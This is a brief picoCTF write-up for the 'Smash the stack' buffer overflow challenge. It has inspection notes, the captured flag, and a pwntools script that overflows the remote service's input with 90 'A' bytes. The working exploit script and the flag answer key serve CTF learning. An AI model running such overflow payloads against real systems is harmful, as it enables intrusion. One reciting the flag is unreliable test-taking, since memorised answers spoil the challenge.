## Task Description
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/522/vuln). You can view source [here](https://artifacts.picoctf.net/c/522/vuln.c). And connect with it using:
`nc saturn.picoctf.net 51110`

## Notes
wget the file and run file and rabin2 to the file.
It is a 32bit ELF.

Running the file to see what it does.
It lets you input a string then exits.
Lets run it once and see what happens if you overflow the input field.
It gives the flag. Nice
```flag
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

## Solve Script
```python
from pwn import *
r = remote('saturn.picoctf.net',51110)
r.recvuntil(b'Input: ')
r.sendline(b'A'*90)
x = r.recv().decode('utf-8')
print(str(x).strip())
r.close()
```
